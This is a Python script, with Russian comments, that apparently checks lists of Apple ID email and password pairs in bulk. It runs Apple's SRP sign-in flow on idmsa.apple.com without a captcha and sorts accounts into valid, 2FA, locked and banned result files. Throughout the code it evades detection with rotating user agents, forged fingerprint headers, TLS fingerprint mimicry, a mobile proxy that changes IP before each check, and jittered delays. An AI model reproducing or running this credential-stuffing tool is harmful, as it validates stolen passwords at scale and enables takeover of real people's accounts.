"""
Apple ID Account Status Checker (SRP-based, NO CAPTCHA)

Проверяет статус аккаунтов через SRP авторизацию на idmsa.apple.com
БЕЗ капчи - быстрее и дешевле чем iforgot flow

Статусы:
- valid: Аккаунт валидный, пароль верный
- valid_sq: Валидный, требует ответы на секретные вопросы
- valid_2fa: Валидный, требует 2FA
- wrong_password: Неверный пароль
- locked: Аккаунт заблокирован
- not_found: Apple ID не существует
- rate_limited: Слишком много запросов
"""

import os
import time
import json
import logging
import base64
import hashlib
import random
import tls_client
import srp
from datetime import datetime
from threading import Lock
from urllib.parse import quote

lock = Lock()

# User-Agent rotation list (Chrome on different OS)
USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

# Language rotation
LANGUAGES = ["en-US", "en-GB", "en-AU", "en-CA"]

# Timezone rotation
TIMEZONES = ["GMT-08:00", "GMT-05:00", "GMT+00:00", "GMT+01:00", "GMT+03:00"]


def generate_fingerprint(user_agent: str, language: str, timezone: str) -> str:
    """
    Generate X-Apple-I-FD-Client-Info header value.
    Simplified version - generates valid structure without full browser fingerprint.
    """
    fingerprint = {
        "U": user_agent,
        "L": language,
        "Z": timezone,
        "V": "1.1",
        "F": ""  # Empty F field - some endpoints accept this
    }
    return json.dumps(fingerprint)


def random_delay(base: float, variance: float = 0.3) -> float:
    """Add random variance to delay (±30% by default)"""
    return base * (1 + random.uniform(-variance, variance))


# Logging
os.makedirs('files/logs', exist_ok=True)
LOG_FILE = f'files/logs/checker_srp_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class AccountStatus:
    VALID = "valid"
    VALID_SQ = "valid_sq"
    VALID_2FA = "valid_2fa"
    WRONG_PASSWORD = "wrong_password"
    LOCKED = "locked"              # -20209: locked for security, can recover via iForgot
    BANNED = "banned"              # -20755, -20210: account not active/disabled (permanent, no recovery)
    TEMP_LOCKED = "temp_locked"    # temporary lock
    NOT_FOUND = "not_found"
    RATE_LIMITED = "rate_limited"
    UNKNOWN = "unknown"
    
    DESCRIPTIONS = {
        VALID: "Valid - password correct",
        VALID_SQ: "Valid - requires security questions",
        VALID_2FA: "Valid - requires 2FA",
        WRONG_PASSWORD: "Wrong password",
        LOCKED: "Locked - can recover via iForgot",
        BANNED: "BANNED - permanent, no recovery",
        TEMP_LOCKED: "Temporary lock - try later",
        NOT_FOUND: "Apple ID not found",
        RATE_LIMITED: "Rate limited - try later",
        UNKNOWN: "Unknown status"
    }


class SrpPassword:
    """Apple's SRP password implementation"""
    def __init__(self, password):
        self._password_hash = hashlib.sha256(password.encode('utf-8')).digest()
        self.salt = None
        self.iterations = None
        self.key_length = None
    
    def set_encrypt_info(self, salt, iterations, key_length):
        self.salt = salt
        self.iterations = iterations
        self.key_length = key_length
    
    def encode(self):
        return hashlib.pbkdf2_hmac('sha256', self._password_hash, self.salt, self.iterations, self.key_length)


class MobileProxyManager:
    """Manages mobile proxy with IP change via API"""
    
    def __init__(self, config_path='../config.json'):
        # Load config
        with open(config_path, 'r') as f:
            config = json.load(f)
        
        proxy_config = config.get('proxy', {})
        self.enabled = proxy_config.get('enabled', False)
        self.host = proxy_config.get('host', '')
        self.port = proxy_config.get('port', '')
        self.user = proxy_config.get('user', '')
        self.passwd = proxy_config.get('pass', '')
        self.change_ip_url = proxy_config.get('change_ip_url', '')
        self.change_ip_cooldown = proxy_config.get('change_ip_cooldown', 65)
        
        if self.enabled and self.host:
            self.proxy = {
                'http': f'http://{self.user}:{self.passwd}@{self.host}:{self.port}',
                'https': f'http://{self.user}:{self.passwd}@{self.host}:{self.port}'
            }
            logger.info(f"Mobile proxy configured: {self.host}:{self.port}")
        else:
            self.proxy = None
            logger.info("Proxy disabled in config")
    
    def change_ip(self):
        """Change IP via API before each request"""
        if not self.change_ip_url:
            return False
        try:
            import requests as req
            resp = req.get(self.change_ip_url, timeout=15)
            logger.info(f"IP change response: {resp.status_code} - {resp.text[:100]}")
            time.sleep(3)  # Wait for IP to change
            return True
        except Exception as e:
            logger.warning(f"Failed to change IP: {e}")
            return False
    
    def get_proxy(self):
        """Get proxy dict for requests"""
        return self.proxy
    
    def wait_until_online(self, retry_delay=10):
        """
        Wait indefinitely until proxy is online.
        Never gives up - keeps retrying until proxy is available.
        """
        if not self.enabled:
            return True  # No proxy = always "online"
        
        import requests as req
        proxy_url = f"http://{self.user}:{self.passwd}@{self.host}:{self.port}"
        proxies = {'http': proxy_url, 'https': proxy_url}
        
        attempt = 0
        while True:
            attempt += 1
            try:
                resp = req.get('https://api.ipify.org?format=json', proxies=proxies, timeout=15)
                if resp.status_code == 200:
                    ip = resp.json().get('ip', 'unknown')
                    logger.info(f"Proxy online. Current IP: {ip}")
                    return True
            except Exception as e:
                logger.warning(f"Proxy offline (attempt {attempt}): {e}")
                logger.info(f"Waiting {retry_delay}s before retry...")
                time.sleep(retry_delay)


class SrpChecker:
    """Check Apple ID status via SRP authentication (no captcha)"""
    
    CLIENT_ID = 'af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3'
    
    def __init__(self, proxy_manager=None):
        self.session = None
        self.headers = {}
        self.proxy_manager = proxy_manager
        self.user_agent = None
        self.language = None
        self.timezone = None
    
    def _init_session(self, change_ip=True):
        # Randomize browser identity for each session
        self.user_agent = random.choice(USER_AGENTS)
        self.language = random.choice(LANGUAGES)
        self.timezone = random.choice(TIMEZONES)
        
        # Build proxy URL for tls_client
        proxy_url = None
        if self.proxy_manager and self.proxy_manager.enabled:
            # Change IP before each account check
            if change_ip:
                self.proxy_manager.change_ip()
            
            proxy_url = f"http://{self.proxy_manager.user}:{self.proxy_manager.passwd}@{self.proxy_manager.host}:{self.proxy_manager.port}"
            logger.info(f"Using proxy: {self.proxy_manager.host}:{self.proxy_manager.port}")
        
        # Use tls_client for better TLS fingerprint (mimics real browser)
        self.session = tls_client.Session(
            client_identifier="chrome_120",
            random_tls_extension_order=True
        )
        
        if proxy_url:
            self.session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            
            # Verify IP through proxy
            try:
                ip_resp = self.session.get('https://api.ipify.org?format=json')
                current_ip = ip_resp.json().get('ip', 'unknown')
                logger.info(f"Current IP: {current_ip}")
            except Exception as e:
                logger.warning(f"Could not verify IP: {e}")
        
        # Generate fingerprint for this session
        fingerprint = generate_fingerprint(self.user_agent, self.language, self.timezone)
        logger.info(f"Browser: {self.user_agent[:50]}... | Lang: {self.language} | TZ: {self.timezone}")
        
        self.headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': f'{self.language},{self.language.split("-")[0]};q=0.9',
            'User-Agent': self.user_agent,
            'Origin': 'https://idmsa.apple.com',
            'Referer': 'https://idmsa.apple.com/',
            'X-Apple-Widget-Key': self.CLIENT_ID,
            'X-Apple-OAuth-Client-Id': self.CLIENT_ID,
            'X-Apple-OAuth-Client-Type': 'firstPartyAuth',
            'X-Apple-OAuth-Redirect-URI': 'https://account.apple.com',
            'X-Apple-OAuth-Response-Type': 'code',
            'X-Apple-OAuth-Response-Mode': 'web_message',
            'X-Apple-Domain-Id': '11',
            'X-Apple-I-FD-Client-Info': fingerprint,
            'X-Apple-I-TimeZone': self.timezone.replace('GMT', 'Etc/GMT').replace('+', '-').replace('--', '+'),
        }
    
    def _b64_encode(self, data: bytes) -> str:
        return base64.b64encode(data).decode('utf-8')
    
    def check(self, email: str, password: str) -> str:
        """
        Check account status via SRP.
        Waits indefinitely for proxy if it fails - never skips accounts.
        Returns: AccountStatus constant
        """
        while True:
            logger.info(f"[{email}] Checking via SRP...")
            self._init_session()
            
            try:
                result = self._do_check(email, password)
                return result
            except Exception as e:
                error_msg = str(e)
                if 'connection refused' in error_msg.lower() or 'connect:' in error_msg.lower() or 'timeout' in error_msg.lower():
                    logger.warning(f"[{email}] Proxy failed: {e}")
                    # Wait for proxy to recover (indefinitely)
                    if self.proxy_manager:
                        logger.info(f"[{email}] Waiting for proxy to recover...")
                        self.proxy_manager.wait_until_online()
                    continue
                else:
                    logger.error(f"[{email}] Error: {e}")
                    return AccountStatus.UNKNOWN
    
    def _do_check(self, email: str, password: str) -> str:
        """Internal check method - performs actual SRP authentication"""
        # Apple SRP is case-sensitive for email - must be lowercase
        email = email.lower()
        
        try:
            # SRP Init
            srp_password = SrpPassword(password)
            srp.rfc5054_enable()
            srp.no_username_in_x()
            usr = srp.User(email, srp_password, hash_alg=srp.SHA256, ng_type=srp.NG_2048)
            uname, A = usr.start_authentication()
            
            init_resp = self.session.post(
                'https://idmsa.apple.com/appleauth/auth/signin/init',
                json={'a': self._b64_encode(A), 'accountName': uname, 'protocols': ['s2k', 's2k_fo']},
                headers=self.headers
            )
            
            # Check init response
            if init_resp.status_code == 503:
                logger.warning(f"[{email}] Rate limited")
                return AccountStatus.RATE_LIMITED
            
            if init_resp.status_code == 400:
                try:
                    data = init_resp.json()
                    if 'serviceErrors' in data:
                        for err in data['serviceErrors']:
                            if 'not found' in err.get('message', '').lower():
                                return AccountStatus.NOT_FOUND
                except:
                    pass
                return AccountStatus.NOT_FOUND
            
            if init_resp.status_code != 200:
                logger.error(f"[{email}] Init failed: {init_resp.status_code}")
                return AccountStatus.UNKNOWN
            
            # Process SRP challenge
            body = init_resp.json()
            salt = base64.b64decode(body['salt'])
            b = base64.b64decode(body['b'])
            srp_password.set_encrypt_info(salt, body['iteration'], 32)
            
            # Update headers
            for h in ['scnt', 'X-Apple-Auth-Attributes', 'X-Apple-ID-Session-Id']:
                if h in init_resp.headers:
                    self.headers[h] = init_resp.headers[h]
            
            # SRP Complete
            m1 = usr.process_challenge(salt, b)
            m2 = usr.H_AMK
            
            complete_resp = self.session.post(
                'https://idmsa.apple.com/appleauth/auth/signin/complete',
                params={'isRememberMeEnabled': 'true'},
                json={'accountName': uname, 'c': body['c'], 'm1': self._b64_encode(m1), 'm2': self._b64_encode(m2), 'rememberMe': False},
                headers=self.headers
            )
            
            status_code = complete_resp.status_code
            logger.info(f"[{email}] Complete: {status_code}")
            
            # Log response body for debugging
            try:
                resp_body = complete_resp.json()
                logger.info(f"[{email}] Response: {resp_body}")
            except:
                pass
            
            # Parse response
            if status_code == 200:
                return AccountStatus.VALID
            
            if status_code == 401:
                # Check if it's rate limit vs actual wrong password
                try:
                    data = complete_resp.json()
                    if 'serviceErrors' in data:
                        for err in data['serviceErrors']:
                            code = err.get('code', '')
                            # -20101 can be rate limit on IP, not just wrong password
                            # If we're getting many -20101 in a row, it's likely rate limit
                            if code == '-20101':
                                logger.warning(f"[{email}] Got -20101 - could be rate limit or wrong password")
                except:
                    pass
                return AccountStatus.WRONG_PASSWORD
            
            if status_code == 403:
                # Try to distinguish between different lock types
                try:
                    data = complete_resp.json()
                    
                    if 'serviceErrors' in data:
                        for err in data['serviceErrors']:
                            code = err.get('code', '')
                            msg = err.get('message', '').lower()
                            
                            # -20755: Account not active (permanent ban, no recovery)
                            if code == '-20755' or 'not active' in msg:
                                return AccountStatus.BANNED
                            
                            # -20209: Locked for security (can recover via iForgot)
                            if code == '-20209' or ('locked' in msg and 'iforgot' in msg):
                                return AccountStatus.LOCKED
                            
                            # -20210: Account disabled (permanent ban)
                            if code == '-20210' or 'disabled' in msg:
                                return AccountStatus.BANNED
                            
                            # Temp lock indicators
                            if 'try again' in msg or 'too many' in msg or code == '-20283':
                                return AccountStatus.TEMP_LOCKED
                        
                except Exception as e:
                    logger.debug(f"[{email}] Could not parse 403 body: {e}")
                
                # Default to locked if can't determine
                return AccountStatus.LOCKED
            
            if status_code == 409:
                # Need additional verification
                try:
                    data = complete_resp.json()
                    auth_type = data.get('authType', '')
                    
                    if auth_type == 'hsa2':
                        return AccountStatus.VALID_2FA
                    elif auth_type == 'sa':
                        return AccountStatus.VALID_SQ
                    else:
                        # Check for 2FA indicators
                        if 'trustedDevices' in str(data) or 'hsa2' in str(data):
                            return AccountStatus.VALID_2FA
                        return AccountStatus.VALID_SQ
                except:
                    return AccountStatus.VALID_SQ
            
            if status_code == 412:
                # Step-up required - account is valid
                return AccountStatus.VALID_SQ
            
            if status_code == 503:
                return AccountStatus.RATE_LIMITED
            
            return AccountStatus.UNKNOWN
            
        except Exception as e:
            error_msg = str(e)
            # Re-raise proxy errors so they can be retried in check()
            if 'connection refused' in error_msg.lower() or 'connect:' in error_msg.lower() or 'timeout' in error_msg.lower():
                raise
            logger.error(f"[{email}] Error: {e}")
            return AccountStatus.UNKNOWN


class AccountManager:
    """Manages account checking"""
    
    def __init__(self, use_proxy=True):
        self.proxy_manager = MobileProxyManager() if use_proxy else None
        self.checker = SrpChecker(proxy_manager=self.proxy_manager)
        self.results = {status: [] for status in [
            AccountStatus.VALID,
            AccountStatus.VALID_SQ,
            AccountStatus.VALID_2FA,
            AccountStatus.WRONG_PASSWORD,
            AccountStatus.LOCKED,
            AccountStatus.BANNED,
            AccountStatus.TEMP_LOCKED,
            AccountStatus.NOT_FOUND,
            AccountStatus.RATE_LIMITED,
            AccountStatus.UNKNOWN
        ]}
    
    def check_account(self, account_line: str) -> str:
        parts = account_line.strip().split(',')
        if len(parts) < 2:
            return AccountStatus.UNKNOWN
        
        email = parts[0].strip()
        password = parts[1].strip()
        
        status = self.checker.check(email, password)
        self.results[status].append(account_line)
        return status
    
    def check_all(self, accounts: list):
        total = len(accounts)
        
        for i, account in enumerate(accounts, 1):
            email = account.split(',')[0].strip()
            print(f"\n[{i}/{total}] Checking: {email}")
            
            # Wait for proxy to be online before checking (never skip)
            if self.proxy_manager and self.proxy_manager.enabled:
                print(f"  Waiting for proxy to be online...")
                self.proxy_manager.wait_until_online()
            
            status = self.check_account(account)
            desc = AccountStatus.DESCRIPTIONS.get(status, status)
            print(f"  Result: {desc}")
            
            if i < total:
                base_delay = self.proxy_manager.change_ip_cooldown if self.proxy_manager else 5
                delay = random_delay(base_delay, 0.2)  # ±20% variance
                print(f"  Waiting {delay:.1f}s...")
                time.sleep(delay)
    
    def save_results(self):
        output_dir = 'files/results'
        os.makedirs(output_dir, exist_ok=True)
        
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        for status, accounts in self.results.items():
            if accounts:
                filepath = f'{output_dir}/{status}.txt'
                with open(filepath, 'w', encoding='utf-8') as f:
                    for acc in accounts:
                        f.write(f"{acc} | {timestamp}\n")
                logger.info(f"Saved {len(accounts)} to {filepath}")
    
    def print_summary(self):
        print("\n" + "="*60)
        print("  RESULTS SUMMARY (SRP Check - No Captcha)")
        print("="*60)
        
        for status, accounts in self.results.items():
            if accounts:
                desc = AccountStatus.DESCRIPTIONS.get(status, status)
                print(f"\n[{status.upper()}] {desc}: {len(accounts)}")
                for acc in accounts:
                    email = acc.split(',')[0].strip()
                    print(f"  - {email}")
        
        print("\n" + "="*60)
        print(f"Results: files/results/")
        print(f"Log: {LOG_FILE}")
        print("="*60)


def main():
    print("="*60)
    print("  Apple ID Checker (SRP - NO CAPTCHA)")
    print("="*60)
    
    try:
        with open('files/Accounts.txt', 'r', encoding='utf-8') as f:
            accounts = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print("Error: files/Accounts.txt not found")
        return
    
    if not accounts:
        print("No accounts to check")
        return
    
    print(f"Found {len(accounts)} account(s)")
    print(f"Log: {LOG_FILE}")
    
    manager = AccountManager()
    manager.check_all(accounts)
    manager.save_results()
    manager.print_summary()


if __name__ == '__main__':
    main()
